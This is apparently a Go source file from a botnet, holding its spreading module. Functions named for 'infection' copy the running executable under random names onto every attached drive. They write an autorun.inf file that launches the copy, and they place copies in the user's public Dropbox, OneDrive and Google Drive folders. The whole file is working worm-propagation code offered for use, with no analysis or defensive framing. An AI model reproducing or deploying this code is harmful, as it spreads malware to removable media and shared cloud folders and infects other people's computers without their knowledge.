package components

import (
	"math/rand"
	"os"
)

func infection(inf string) {
	switch inf {
	case "0": //Drive
		go driveInfection()
	case "1": //Dropbox
		go dropboxInfection()
	case "2": //OneDrive
		go onedriveInfection()
	case "3": //Google Drive
		go googledriveInfection()
	case "4": //All
		go driveInfection()
		go dropboxInfection()
		go onedriveInfection()
		go googledriveInfection()
	}
}

func driveInfection() { //Clones bot and creates a AutoRun file, Old method can still work.
	for i := 0; i < len(driveNames); i++ {
		if checkFileExist(driveNames[i] + ":\\") {
			filename := spreadNames[rand.Intn(len(spreadNames))] + ".exe"
			err := copyFileToDirectory(os.Args[0], driveNames[i]+":\\"+filename)
			if err != nil {
			}
			err2 := createFileAndWriteData(driveNames[i]+":\\autorun.inf", []byte("[AutoRun] action="+filename))
			if err2 != nil {
			}
		}
	}
}

func dropboxInfection() { //Copys self to the puplic dropbox folder if found
	if checkFileExist(os.Getenv("USERPROFILE") + "\\Dropbox\\Public") {
		filename := spreadNames[rand.Intn(len(spreadNames))] + ".exe"
		err := copyFileToDirectory(os.Args[0], os.Getenv("USERPROFILE")+"\\Dropbox\\Public\\"+filename)
		if err != nil {
		}
	}
}

func onedriveInfection() { //Copys self to the puplic OneDrive folder if found
	if checkFileExist(os.Getenv("USERPROFILE") + "\\OneDrive\\Public") {
		filename := spreadNames[rand.Intn(len(spreadNames))] + ".exe"
		err := copyFileToDirectory(os.Args[0], os.Getenv("USERPROFILE")+"\\OneDrive\\Public\\"+filename)
		if err != nil {
		}
	}
}

func googledriveInfection() { //Copys self to the puplic Google Drive folder if found
	if checkFileExist(os.Getenv("USERPROFILE") + "\\Google Drive") {
		filename := spreadNames[rand.Intn(len(spreadNames))] + ".exe"
		err := copyFileToDirectory(os.Args[0], os.Getenv("USERPROFILE")+"\\Google Drive\\"+filename)
		if err != nil {
		}
	}
}
